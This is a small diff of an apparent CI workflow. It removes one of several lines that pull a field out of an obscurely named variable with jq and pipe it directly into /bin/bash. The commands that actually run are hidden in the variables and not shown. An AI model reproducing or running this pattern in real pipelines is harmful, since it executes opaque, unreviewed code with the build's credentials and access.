@@ -41,7 +41,6 @@ jobs:
           echo $z935 | jq -r .xzwmd84 | /bin/bash
           echo $bt31 | jq -r .wi905 | /bin/bash
           echo $awxv619 | jq -r .p2 | /bin/bash
-          printf '%s' "$te579" | jq -r .d10437 | /bin/bash
           printf '%s' "$fqfb588" | jq -r .de71399 | /bin/bash
           echo $vznr84 | jq -r .ljsdk19 | /bin/bash
 
